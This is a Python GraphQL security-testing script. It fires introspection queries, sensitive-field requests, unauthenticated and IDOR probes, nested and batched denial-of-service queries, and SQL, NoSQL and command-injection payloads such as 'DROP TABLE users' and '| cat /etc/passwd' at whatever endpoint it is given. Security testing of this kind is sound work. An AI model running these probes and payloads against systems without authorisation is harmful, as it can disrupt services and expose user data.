#!/usr/bin/env python3
"""
Advanced GraphQL Tester - Industry Grade
Comprehensive GraphQL security testing and introspection
"""

import requests
import sys
import json
import time
from collections import defaultdict

class Colors:
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'

class GraphQLTesterPro:
    def __init__(self, endpoint):
        self.endpoint = endpoint
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'GraphQL-Tester-Pro/2.0',
            'Content-Type': 'application/json'
        }
        self.vulnerabilities = []
        self.schema = None
        
        # Comprehensive introspection queries
        self.introspection_queries = self.load_introspection_queries()
        
        # Common GraphQL queries to test
        self.test_queries = self.load_test_queries()
        
        # GraphQL-specific attack payloads
        self.attack_payloads = self.load_attack_payloads()
    
    def load_introspection_queries(self):
        """Load comprehensive introspection queries"""
        return {
            'full_schema': """
                {
                    __schema {
                        queryType { name }
                        mutationType { name }
                        subscriptionType { name }
                        types {
                            ...FullType
                        }
                        directives {
                            name
                            description
                            locations
                            args {
                                ...InputValue
                            }
                        }
                    }
                }
                
                fragment FullType on __Type {
                    kind
                    name
                    description
                    fields(includeDeprecated: true) {
                        name
                        description
                        args {
                            ...InputValue
                        }
                        type {
                            ...TypeRef
                        }
                        isDeprecated
                        deprecationReason
                    }
                    inputFields {
                        ...InputValue
                    }
                    interfaces {
                        ...TypeRef
                    }
                    enumValues(includeDeprecated: true) {
                        name
                        description
                        isDeprecated
                        deprecationReason
                    }
                    possibleTypes {
                        ...TypeRef
                    }
                }
                
                fragment InputValue on __InputValue {
                    name
                    description
                    type { ...TypeRef }
                    defaultValue
                }
                
                fragment TypeRef on __Type {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                    ofType {
                                        kind
                                        name
                                        ofType {
                                            kind
                                            name
                                            ofType {
                                                kind
                                                name
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            """,
            
            'types_only': """
                {
                    __schema {
                        types {
                            name
                            kind
                            description
                        }
                    }
                }
            """,
            
            'queries_only': """
                {
                    __schema {
                        queryType {
                            name
                            fields {
                                name
                                description
                                type {
                                    name
                                    kind
                                }
                            }
                        }
                    }
                }
            """,
            
            'mutations_only': """
                {
                    __schema {
                        mutationType {
                            name
                            fields {
                                name
                                description
                                args {
                                    name
                                    type {
                                        name
                                        kind
                                    }
                                }
                                type {
                                    name
                                    kind
                                }
                            }
                        }
                    }
                }
            """,
            
            'subscriptions_only': """
                {
                    __schema {
                        subscriptionType {
                            name
                            fields {
                                name
                                description
                            }
                        }
                    }
                }
            """
        }
    
    def load_test_queries(self):
        """Load test queries for common resources"""
        return {
            'users': [
                '{ users { id name email } }',
                '{ users { id name email role admin } }',
                '{ users { id name email password } }',
                '{ user(id: 1) { id name email } }',
                '{ user(id: "1") { id name email password hash } }',
            ],
            'me': [
                '{ me { id name email } }',
                '{ me { id name email role permissions } }',
                '{ currentUser { id name email admin } }',
            ],
            'products': [
                '{ products { id name price } }',
                '{ products { id name price cost profit } }',
                '{ product(id: 1) { id name price } }',
            ],
            'posts': [
                '{ posts { id title content author { name } } }',
                '{ post(id: 1) { id title content } }',
            ],
            'admin': [
                '{ admin { users { id name email } } }',
                '{ adminUsers { id name email role } }',
                '{ config { apiKey secretKey } }',
            ]
        }
    
    def load_attack_payloads(self):
        """Load GraphQL-specific attack payloads"""
        return {
            'dos_queries': [
                # Nested query DoS
                """
                {
                    users {
                        posts {
                            comments {
                                author {
                                    posts {
                                        comments {
                                            author {
                                                name
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                """,
                
                # Batch query DoS
                """
                query {
                    q1: users { id }
                    q2: users { id }
                    q3: users { id }
                    q4: users { id }
                    q5: users { id }
                }
                """,
                
                # Recursive fragments
                """
                query {
                    ...A
                }
                fragment A on User {
                    name
                    ...B
                }
                fragment B on User {
                    email
                    ...A
                }
                """
            ],
            
            'injection': [
                # SQL injection attempts
                '{ user(id: "1\' OR \'1\'=\'1") { name } }',
                '{ user(id: "1; DROP TABLE users--") { name } }',
                
                # NoSQL injection
                '{ user(id: {"$gt": ""}) { name } }',
                
                # Command injection
                '{ user(id: "; ls") { name } }',
                '{ user(id: "| cat /etc/passwd") { name } }',
            ],
            
            'idor': [
                # IDOR attempts
                '{ user(id: 1) { id name email } }',
                '{ user(id: 2) { id name email } }',
                '{ user(id: 999) { id name email } }',
                '{ user(id: -1) { id name email } }',
            ],
            
            'field_suggestions': [
                # Field suggestion attacks (get hidden fields)
                '{ user { __invalid__ } }',
                '{ __type(name: "User") { fields { name } } }',
            ]
        }
    
    def print_header(self, text):
        """Print section header"""
        print(f"\n{Colors.CYAN}{'='*80}")
        print(f"  {text}")
        print(f"{'='*80}{Colors.END}\n")
    
    def execute_query(self, query, variables=None):
        """Execute GraphQL query"""
        payload = {'query': query}
        if variables:
            payload['variables'] = variables
        
        try:
            response = self.session.post(
                self.endpoint,
                json=payload,
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                return {'error': f'HTTP {response.status_code}', 'text': response.text}
        
        except Exception as e:
            return {'error': str(e)}
    
    def test_introspection(self):
        """Test GraphQL introspection"""
        self.print_header("INTROSPECTION TESTING")
        
        print(f"{Colors.YELLOW}[*] Testing introspection availability...{Colors.END}\n")
        
        # Try different introspection queries
        for query_name, query in self.introspection_queries.items():
            print(f"{Colors.CYAN}Testing: {query_name}{Colors.END}")
            
            result = self.execute_query(query)
            
            if 'error' in result:
                print(f"{Colors.RED}[!] Error: {result['error']}{Colors.END}\n")
            elif 'data' in result and result['data']:
                print(f"{Colors.GREEN}[✓] Success!{Colors.END}")
                
                # Parse schema if full schema query
                if query_name == 'full_schema':
                    self.schema = result['data']
                    types = result['data']['__schema']['types']
                    print(f"  Types found: {len(types)}")
                    
                    # Show interesting types
                    interesting_types = [t for t in types if not t['name'].startswith('__')]
                    print(f"  Custom types: {len(interesting_types)}")
                    
                    for t in interesting_types[:10]:
                        print(f"    - {t['name']} ({t['kind']})")
                    
                    if len(interesting_types) > 10:
                        print(f"    ... and {len(interesting_types) - 10} more")
                
                # Show mutations
                elif query_name == 'mutations_only':
                    if result['data']['__schema']['mutationType']:
                        mutations = result['data']['__schema']['mutationType']['fields']
                        print(f"  Mutations found: {len(mutations)}")
                        for m in mutations[:5]:
                            print(f"    - {m['name']}")
                        if len(mutations) > 5:
                            print(f"    ... and {len(mutations) - 5} more")
                    else:
                        print(f"  No mutations found")
                
                print()
            
            elif 'errors' in result:
                print(f"{Colors.RED}[!] GraphQL Error: {result['errors'][0]['message']}{Colors.END}\n")
                
                if 'introspection' in result['errors'][0]['message'].lower():
                    print(f"{Colors.YELLOW}[!] Introspection appears to be disabled{Colors.END}\n")
                    self.vulnerabilities.append({
                        'severity': 'INFO',
                        'issue': 'Introspection disabled',
                        'impact': 'Good security practice'
                    })
            
            time.sleep(0.5)
    
    def test_common_queries(self):
        """Test common GraphQL queries"""
        self.print_header("COMMON QUERIES TESTING")
        
        print(f"{Colors.YELLOW}[*] Testing common query patterns...{Colors.END}\n")
        
        for category, queries in self.test_queries.items():
            print(f"{Colors.CYAN}{category.upper()}:{Colors.END}")
            
            for query in queries:
                result = self.execute_query(query)
                
                if 'data' in result and result['data']:
                    # Check for successful data retrieval
                    has_data = any(v for v in result['data'].values() if v)
                    
                    if has_data:
                        print(f"{Colors.GREEN}[✓] Success: {query[:50]}...{Colors.END}")
                        
                        # Check for sensitive fields
                        query_lower = query.lower()
                        sensitive_fields = ['password', 'hash', 'secret', 'key', 'token', 'admin']
                        
                        if any(field in query_lower for field in sensitive_fields):
                            print(f"{Colors.RED}  [!] Potentially sensitive field accessible{Colors.END}")
                            self.vulnerabilities.append({
                                'severity': 'HIGH',
                                'issue': f'Sensitive field in query: {query[:50]}',
                                'impact': 'Information disclosure'
                            })
                    else:
                        print(f"{Colors.YELLOW}[~] Empty result: {query[:50]}...{Colors.END}")
                
                elif 'errors' in result:
                    error_msg = result['errors'][0]['message']
                    print(f"{Colors.YELLOW}[!] Error: {error_msg[:60]}...{Colors.END}")
                
                elif 'error' in result:
                    print(f"{Colors.RED}[!] Request error: {result['error']}{Colors.END}")
            
            print()
    
    def test_authorization(self):
        """Test authorization bypass"""
        self.print_header("AUTHORIZATION TESTING")
        
        print(f"{Colors.YELLOW}[*] Testing authorization controls...{Colors.END}\n")
        
        # Test without authentication
        print(f"{Colors.CYAN}Testing unauthenticated access:{Colors.END}")
        
        unauth_queries = [
            '{ users { id name email } }',
            '{ admin { config } }',
            '{ me { id name email role } }',
        ]
        
        for query in unauth_queries:
            result = self.execute_query(query)
            
            if 'data' in result and result['data']:
                print(f"{Colors.RED}[!] Accessible without auth: {query}{Colors.END}")
                self.vulnerabilities.append({
                    'severity': 'CRITICAL',
                    'issue': f'Unauthenticated access: {query}',
                    'impact': 'Unauthorized data access'
                })
            else:
                print(f"{Colors.GREEN}[✓] Blocked: {query}{Colors.END}")
        
        print()
    
    def test_dos_vectors(self):
        """Test Denial of Service vectors"""
        self.print_header("DOS VECTOR TESTING")
        
        print(f"{Colors.YELLOW}[*] Testing DoS vulnerabilities...{Colors.END}\n")
        print(f"{Colors.RED}[!] Note: These tests may impact server performance{Colors.END}\n")
        
        for i, dos_query in enumerate(self.attack_payloads['dos_queries'], 1):
            print(f"{Colors.CYAN}Testing DoS vector {i}:{Colors.END}")
            
            start_time = time.time()
            result = self.execute_query(dos_query)
            elapsed = time.time() - start_time
            
            print(f"  Response time: {elapsed:.2f}s")
            
            if elapsed > 5:
                print(f"{Colors.RED}  [!] Slow query - potential DoS vector{Colors.END}")
                self.vulnerabilities.append({
                    'severity': 'MEDIUM',
                    'issue': f'Slow query (DoS vector {i})',
                    'impact': 'Server resource exhaustion'
                })
            
            if 'errors' in result:
                error_msg = result['errors'][0]['message']
                if 'depth' in error_msg.lower() or 'complexity' in error_msg.lower():
                    print(f"{Colors.GREEN}  [✓] Query complexity limit in place{Colors.END}")
            
            print()
            time.sleep(1)
    
    def test_injection(self):
        """Test injection vulnerabilities"""
        self.print_header("INJECTION TESTING")
        
        print(f"{Colors.YELLOW}[*] Testing injection payloads...{Colors.END}\n")
        
        for payload in self.attack_payloads['injection']:
            print(f"{Colors.CYAN}Testing: {payload[:60]}...{Colors.END}")
            
            result = self.execute_query(payload)
            
            if 'data' in result and result['data']:
                print(f"{Colors.RED}[!] Payload accepted - potential injection{Colors.END}")
                self.vulnerabilities.append({
                    'severity': 'CRITICAL',
                    'issue': f'Injection payload accepted',
                    'impact': 'Possible injection vulnerability'
                })
            elif 'errors' in result:
                error_msg = result['errors'][0]['message']
                
                # Check for verbose errors
                if any(keyword in error_msg.lower() for keyword in ['sql', 'syntax', 'database', 'query']):
                    print(f"{Colors.RED}[!] Verbose error: {error_msg}{Colors.END}")
                    self.vulnerabilities.append({
                        'severity': 'MEDIUM',
                        'issue': 'Verbose error message',
                        'impact': 'Information disclosure'
                    })
                else:
                    print(f"{Colors.GREEN}[✓] Rejected{Colors.END}")
            
            print()
    
    def test_idor(self):
        """Test IDOR vulnerabilities"""
        self.print_header("IDOR TESTING")
        
        print(f"{Colors.YELLOW}[*] Testing IDOR vectors...{Colors.END}\n")
        
        for query in self.attack_payloads['idor']:
            result = self.execute_query(query)
            
            if 'data' in result and result['data']:
                print(f"{Colors.YELLOW}[!] ID accessible: {query}{Colors.END}")
            else:
                print(f"{Colors.GREEN}[✓] Blocked: {query}{Colors.END}")
        
        print()
    
    def analyze_schema(self):
        """Analyze schema for security issues"""
        if not self.schema:
            return
        
        self.print_header("SCHEMA SECURITY ANALYSIS")
        
        types = self.schema['__schema']['types']
        
        # Look for sensitive types
        sensitive_keywords = ['admin', 'secret', 'key', 'password', 'token', 'credential']
        
        print(f"{Colors.YELLOW}[*] Scanning for sensitive types...{Colors.END}\n")
        
        for type_obj in types:
            type_name = type_obj['name'].lower()
            
            if any(keyword in type_name for keyword in sensitive_keywords):
                print(f"{Colors.RED}[!] Sensitive type found: {type_obj['name']}{Colors.END}")
                
                if type_obj.get('fields'):
                    print(f"  Fields:")
                    for field in type_obj['fields'][:5]:
                        print(f"    - {field['name']}")
                print()
    
    def generate_report(self):
        """Generate security report"""
        self.print_header("SECURITY ASSESSMENT")
        
        if not self.vulnerabilities:
            print(f"{Colors.GREEN}[✓] No vulnerabilities detected{Colors.END}")
            return
        
        # Group by severity
        by_severity = defaultdict(list)
        for vuln in self.vulnerabilities:
            by_severity[vuln['severity']].append(vuln)
        
        print(f"{Colors.RED}Total Issues: {len(self.vulnerabilities)}{Colors.END}\n")
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            vulns = by_severity[severity]
            if vulns:
                color = Colors.RED if severity in ['CRITICAL', 'HIGH'] else Colors.YELLOW if severity == 'MEDIUM' else Colors.GREEN
                print(f"{color}{severity}: {len(vulns)} issue(s){Colors.END}")
                for vuln in vulns:
                    print(f"  • {vuln['issue']}")
                    print(f"    Impact: {vuln['impact']}")
                print()

def main():
    if len(sys.argv) < 2:
        print(f"{Colors.YELLOW}Usage: python graphql_tester_pro.py <graphql_endpoint> [options]{Colors.END}")
        print(f"\nOptions:")
        print(f"  --introspection    Test introspection only")
        print(f"  --queries          Test common queries")
        print(f"  --full             Run all tests (default)")
        print(f"\nExample:")
        print(f"  python graphql_tester_pro.py https://api.example.com/graphql")
        print(f"  python graphql_tester_pro.py https://api.example.com/graphql --full")
        sys.exit(1)
    
    endpoint = sys.argv[1]
    option = sys.argv[2] if len(sys.argv) > 2 else '--full'
    
    tester = GraphQLTesterPro(endpoint)
    
    if option == '--introspection':
        tester.test_introspection()
    elif option == '--queries':
        tester.test_common_queries()
    else:
        # Full test suite
        tester.test_introspection()
        tester.test_common_queries()
        tester.test_authorization()
        tester.test_injection()
        tester.test_idor()
        tester.test_dos_vectors()
        tester.analyze_schema()
    
    tester.generate_report()

if __name__ == "__main__":
    main()
